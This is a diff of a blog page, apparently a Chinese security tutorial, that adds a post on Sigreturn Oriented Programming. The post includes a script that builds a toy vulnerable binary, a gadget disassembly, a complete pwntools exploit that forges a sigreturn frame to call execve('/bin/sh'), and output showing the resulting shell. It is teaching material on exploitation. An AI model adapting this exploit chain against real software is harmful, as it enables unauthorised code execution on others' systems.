@@ -13,10 +13,10 @@
     <meta property="og:title" content="SROP - 诚安">
     <meta property="og:type" content="article">
         
-    <meta property="article:published_time" content='2021-05-09T00:00:00&#43;08:00'>
+    <meta property="article:published_time" content='2023-02-11T00:00:00&#43;08:00'>
         
         
-    <meta property="article:modified_time" content='2021-05-09T00:00:00&#43;08:00'>
+    <meta property="article:modified_time" content='2023-02-11T00:00:00&#43;08:00'>
         
     <meta name="Keywords" content="信息安全、主机安全、网络安全、二进制、数据安全">
     <meta name="description" content="SROP">
@@ -140,7 +140,11 @@
 <div class="post-toc" style="position: absolute; top: 188px;">
     <h2 class="post-toc-title">文章目录</h2>
     <div class="post-toc-content">
-        <nav id="TableOfContents"></nav>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn-success">pwn success</a></li>
+  </ul>
+</nav>
     </div>
 </div>
 <script type="text/javascript">
@@ -179,7 +183,7 @@
             <h1 class="post-title">SROP</h1>
         </header>
         <date class="post-meta meta-date">
-            2021年5月9日
+            2023年2月11日
         </date>
         
         <div class="post-meta">
@@ -203,7 +207,102 @@
         </div>
         
         <div class="post-content">
-            
+            <h1 id="srop">SROP</h1>
+<p>Sigreturn Oriented Programming
+(SROP), a novel technique for exploits and backdoors in
+UNIX-like systems. 具体见[1]。</p>
+<h1 id="漏洞程序">漏洞程序</h1>
+<ol>
+<li>vuln程序</li>
+</ol>
+<pre tabindex="0"><code>from pwn import *
+
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+
+elf = ELF.from_assembly(
+    &#39;&#39;&#39;
+        mov rdi, 0;
+        mov rsi, rsp;
+        sub rsi, 8;
+        mov rdx, 500;
+        syscall;
+        ret;
+        
+        pop rax;
+        ret;
+    &#39;&#39;&#39;, vma=0x41000
+)
+elf.save(&#39;vuln&#39;)
+</code></pre><pre tabindex="0"><code>└─$ cat /usr/include/asm/unistd_64.h | grep -i sigreturn -A2
+#define __NR_rt_sigreturn 15
+#define __NR_ioctl 16
+#define __NR_pread64 17
+</code></pre><ol start="2">
+<li>嵌入shell地址</li>
+</ol>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/exploits/srop]
+└─$ echo -en &#34;/bin/sh\x00&#34; &gt;&gt; vuln
+
+┌──(kali㉿kali)-[~/exploits/srop]
+└─$ strings -tx vuln |grep /bin/sh
+   1238 /bin/sh
+</code></pre><h1 id="pwn">pwn</h1>
+<ol>
+<li>查看gadget</li>
+</ol>
+<pre tabindex="0"><code>$ objdump -d -M intel vuln
+vuln:     file format elf64-x86-64
+Disassembly of section .shellcode:
+
+0000000000041000 &lt;__start&gt;:
+   41000:	48 c7 c7 00 00 00 00 	mov    rdi,0x0
+   41007:	48 89 e6             	mov    rsi,rsp
+   4100a:	48 83 ee 08          	sub    rsi,0x8
+   4100e:	48 c7 c2 f4 01 00 00 	mov    rdx,0x1f4
+   41015:	0f 05                	syscall
+   41017:	c3                   	ret
+   41018:	58                   	pop    rax
+   41019:	c3                   	ret
+</code></pre><ol start="2">
+<li>pwn</li>
+</ol>
+<pre tabindex="0"><code>from pwn import *
+
+elf = context.binary = ELF(&#39;./vuln&#39;, checksec=False)
+p = process()
+
+BINSH = elf.address + 0x1238
+POP_RAX = 0x41018
+SYSCALL_RET = 0x41015
+
+frame = SigreturnFrame()
+frame.rax = 0x3b            # syscall number for execve
+frame.rdi = BINSH           # pointer to /bin/sh
+frame.rsi = 0x0             # NULL
+frame.rdx = 0x0             # NULL
+frame.rip = SYSCALL_RET
+
+payload = b&#39;A&#39; * 8
+payload += p64(POP_RAX)
+payload += p64(0xf)         # syscall number for sigreturn
+payload += p64(SYSCALL_RET) # execute syscall instruction
+payload += bytes(frame)
+
+p.sendline(payload)
+p.interactive()
+</code></pre><h2 id="pwn-success">pwn success</h2>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/exploits/srop]
+└─$ python exploit.py      
+[+] Starting local process &#39;/home/kali/exploits/srop/vuln&#39;: pid 1960175
+[*] Switching to interactive mode
+$ who
+kali     pts/0        Feb 13 20:48 (192.168.44.1) 
+</code></pre><h1 id="参考">参考</h1>
+<ol>
+<li>[1] <a href="https://angold4.wordpress.com/2021/02/01/sigreturn-oriented-programming-attack/">Sigreturn Oriented Programming Attack</a></li>
+</ol>
+
         </div>
 
         
@@ -224,15 +323,15 @@
     <h2>See Also</h2>
     <ul class="listing">
         
-        <li><a href="/fightsec/post/pwn_03_shellcode/">shellcode</a></li>
-        
         <li><a href="/fightsec/post/pwn_02_rop/">ROP</a></li>
         
-        <li><a href="/fightsec/post/pwn_01_pwntools/">pwn</a></li>
+        <li><a href="/fightsec/post/pwn_04_ret2libc/">ret2libc</a></li>
         
-        <li><a href="/fightsec/post/p02_pwn_04_exp_kernel/">Linux Kernel Exploitation Technique: Overwriting: modprobe_path</a></li>
+        <li><a href="/fightsec/post/arm_20_grooming_ios_kernel_heap/">ios内核堆梳理</a></li>
         
-        <li><a href="/fightsec/post/pwn_05_ret2plt/">ret2plt</a></li>
+        <li><a href="/fightsec/post/arm_19_ios_kernel_heap_overflow/">ios kernel和堆溢出</a></li>
+        
+        <li><a href="/fightsec/post/arm_18_heap_overflow_dev/">arm 堆溢出</a></li>
         
     </ul>
 </div>
@@ -369,7 +468,15 @@
 <ul class="widget-list">
     
     <li>
-        <a href="https://winsun.github.io/fightsec/post/p04_vul_springshell_05/" title="springshell">springshell</a>
+        <a href="https://winsun.github.io/fightsec/post/pwn_06_srop/" title="SROP">SROP</a>
+    </li>
+    
+    <li>
+        <a href="https://winsun.github.io/fightsec/post/pwn_02_rop/" title="ROP">ROP</a>
+    </li>
+    
+    <li>
+        <a href="https://winsun.github.io/fightsec/post/p04_vul_06_springshell/" title="springshell">springshell</a>
     </li>
     
     <li>
@@ -398,14 +505,6 @@
     
     <li>
         <a href="https://winsun.github.io/fightsec/post/cyber_11_backdoor/" title="后门程序">后门程序</a>
-    </li>
-    
-    <li>
-        <a href="https://winsun.github.io/fightsec/post/ml_03_random_variable/" title="预期效用">预期效用</a>
-    </li>
-    
-    <li>
-        <a href="https://winsun.github.io/fightsec/post/cyber_10_scanner/" title="网络扫描">网络扫描</a>
     </li>
     
 </ul>
